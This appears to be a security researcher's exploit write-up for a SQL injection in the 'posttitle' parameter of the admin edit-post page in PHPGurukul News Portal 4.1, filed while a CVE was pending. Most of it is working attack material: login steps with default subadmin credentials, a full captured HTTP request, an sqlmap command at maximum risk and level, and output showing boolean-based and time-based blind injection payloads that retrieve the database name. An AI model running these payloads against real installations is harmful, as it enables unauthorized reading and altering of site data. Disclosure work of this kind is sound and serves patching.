# News Portal - SQL Injection - 3
+ **Exploit Title:** News Portal - SQL Injection - 3
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/news-portal-project-in-php-and-mysql/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7643
+ **Version:** 4.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
News Portal System  4.1 allows SQL Injection via the 'posttitle' parameter in "http://localhost/newsportal/admin/edit-post.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost//newsportal/admin/index.php"
+ Log in with `subadmin` :`Test@123`
+ Click manage posts then click edit posts
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /newsportal/admin/edit-post.php?pid=13 HTTP/1.1
Host: localhost
Content-Length: 1538
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/newsportal/admin/edit-post.php?pid=13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=dfcdlcor0hrif7af2b2tjeejt6
Connection: close

posttitle=T20+World+Cup+2021%3A+Semi-final+1%2C+England+vs+New+Zealand+%C3%A2%E2%82%AC%E2%80%9C+Who+Said+What&category=3&subcategory=4&postdescription=%3Cp+style%3D%22margin-bottom%3A+3rem%3B+font-size%3A+20px%3B+color%3A+rgb%2841%2C+41%2C+41%29%3B+line-height%3A+1.6%3B+font-family%3A+%26quot%3BProxima+Nova%26quot%3B%3B%22%3ENew+Zealand+held+their+nerves+admirably+to+make+it+a+hat-trick+of+ICC+event+final+entrances%2C+trumping%26nbsp%3B%3Ca+href%3D%22https%3A%2F%2Fwww.crictracker.com%2Fcricket-teams%2Fengland%2F%22+target%3D%22_blank%22+rel%3D%22noopener%22+style%3D%22color%3A+rgb%284%2C+93%2C+233%29%3B%22%3E%3Cstrong%3EEngland%3C%2Fstrong%3E%3C%2Fa%3E%26nbsp%3Bin+a+see-sawing+semi-final+clash+in+Abu+Dhabi.+You+would+feel+they+are+too+nice+to+believe+in+revenging+anything%2C+even+if+it+is+as+bitter+as+the+fateful+2019+ODI+World+Cup+loss%2C+so+let%C3%A2%E2%82%AC%E2%84%A2s+put+it+this+way%3A+the+scores+are+settled.+And+in+doing+so%2C+New+Zealand+have+made+it+to+the+finals+of+a+tournament+no+one+counted+them+as+the+favourites+of.%26nbsp%3B%3C%2Fp%3E%3Cp+style%3D%22margin-bottom%3A+3rem%3B+font-size%3A+20px%3B+color%3A+rgb%2841%2C+41%2C+41%29%3B+line-height%3A+1.6%3B+font-family%3A+%26quot%3BProxima+Nova%26quot%3B%3B%22%3EAfter+being+inserted%2C+a+Jason+Roy-less+England+managed+166%2F4+largely+on+the+back+of+Dawid+Malan+%2841+off+30%29%2C+who+got+back+his+mojo+at+the+right+time%2C+and+Moeen+Ali+%2851+off+37%29%2C+who+proved+it+for+the+umpteenth+time+what+a+marvellous+short-format+asset+he+is.%3C%2Fp%3E&files=&update=
```

+ Use sqlmap to exploit. In sqlmap, use 'posttitle' parameter to dump the database.
```
sqlmap -r r.txt -p posttitle --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: posttitle (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: posttitle=T20 World Cup 2021: Semi-final 1, England vs New Zealand %C3%A2%E2%82%AC%E2%80%9C Who Said What' WHERE 2968=2968 AND 4622=(SELECT (CASE WHEN (4622=4622) THEN 4622 ELSE (SELECT 9576 UNION SELECT 1829) END))-- -&category=3&subcategory=4&postdescription=<p style="margin-bottom: 3rem; font-size: 20px; color: rgb(41, 41, 41); line-height: 1.6; font-family: %26quot;Proxima Nova%26quot;;">New Zealand held their nerves admirably to make it a hat-trick of ICC event final entrances, trumping%26nbsp;<a href="https://www.crictracker.com/cricket-teams/england/" target="_blank" rel="noopener" style="color: rgb(4, 93, 233);"><strong>England</strong></a>%26nbsp;in a see-sawing semi-final clash in Abu Dhabi. You would feel they are too nice to believe in revenging anything, even if it is as bitter as the fateful 2019 ODI World Cup loss, so let%C3%A2%E2%82%AC%E2%84%A2s put it this way: the scores are settled. And in doing so, New Zealand have made it to the finals of a tournament no one counted them as the favourites of.%26nbsp;</p><p style="margin-bottom: 3rem; font-size: 20px; color: rgb(41, 41, 41); line-height: 1.6; font-family: %26quot;Proxima Nova%26quot;;">After being inserted, a Jason Roy-less England managed 166/4 largely on the back of Dawid Malan (41 off 30), who got back his mojo at the right time, and Moeen Ali (51 off 37), who proved it for the umpteenth time what a marvellous short-format asset he is.</p>&files=&update=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: posttitle=T20 World Cup 2021: Semi-final 1, England vs New Zealand %C3%A2%E2%82%AC%E2%80%9C Who Said What' WHERE 9212=9212 AND (SELECT 4954 FROM (SELECT(SLEEP(5)))IWkb)-- nhrv&category=3&subcategory=4&postdescription=<p style="margin-bottom: 3rem; font-size: 20px; color: rgb(41, 41, 41); line-height: 1.6; font-family: %26quot;Proxima Nova%26quot;;">New Zealand held their nerves admirably to make it a hat-trick of ICC event final entrances, trumping%26nbsp;<a href="https://www.crictracker.com/cricket-teams/england/" target="_blank" rel="noopener" style="color: rgb(4, 93, 233);"><strong>England</strong></a>%26nbsp;in a see-sawing semi-final clash in Abu Dhabi. You would feel they are too nice to believe in revenging anything, even if it is as bitter as the fateful 2019 ODI World Cup loss, so let%C3%A2%E2%82%AC%E2%84%A2s put it this way: the scores are settled. And in doing so, New Zealand have made it to the finals of a tournament no one counted them as the favourites of.%26nbsp;</p><p style="margin-bottom: 3rem; font-size: 20px; color: rgb(41, 41, 41); line-height: 1.6; font-family: %26quot;Proxima Nova%26quot;;">After being inserted, a Jason Roy-less England managed 166/4 largely on the back of Dawid Malan (41 off 30), who got back his mojo at the right time, and Moeen Ali (51 off 37), who proved it for the umpteenth time what a marvellous short-format asset he is.</p>&files=&update=
---
[19:18:59] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:18:59] [INFO] fetching current database
[19:18:59] [INFO] retrieving the length of query output
[19:18:59] [INFO] retrieved: 10
[19:19:01] [INFO] retrieved: newsportal             
current database: 'newsportal'wsportal             
current database: 'newsportal'
```
+ current database: `newsportal`

![Ekran görüntüsü 2024-04-01 022235](https://github.com/BurakSevben/CVEs/assets/117217689/e1cea114-1909-4146-b7d4-3fb28751e779)
